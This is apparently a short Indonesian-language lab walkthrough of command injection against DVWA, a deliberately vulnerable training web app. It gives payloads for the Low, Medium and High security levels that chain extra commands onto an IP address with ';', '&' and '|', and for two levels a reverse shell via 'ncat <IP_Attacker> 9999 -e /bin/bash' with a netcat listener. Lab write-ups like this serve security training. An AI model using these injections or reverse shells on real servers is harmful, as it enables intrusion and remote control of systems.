# Command Injection
Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.

## Security Low
```sh
127.0.0.1; ls
``` 
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%201.JPG)

```sh
127.0.0.1; whoami; hostname
```
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%202.JPG)

Menjalankan Reverse Shell di Server
```sh
127.0.0.1; ncat <IP_Attacker> 9999 -e /bin/bash
```

Listener
```sh
nc -lnvp 9999
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%203.JPG)

## Security Medium
```sh
127.0.0.1& ls
```
```sh
127.0.0.1& whoami& hostname
```
```sh
127.0.0.1& ncat <IP_Attacker> 9999 -e /bin/bash
```

## Security High
Di level ini kita hanya bisa mengeksekusi 1 perintah saja
```sh
127.0.0.1|ls
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%204.JPG)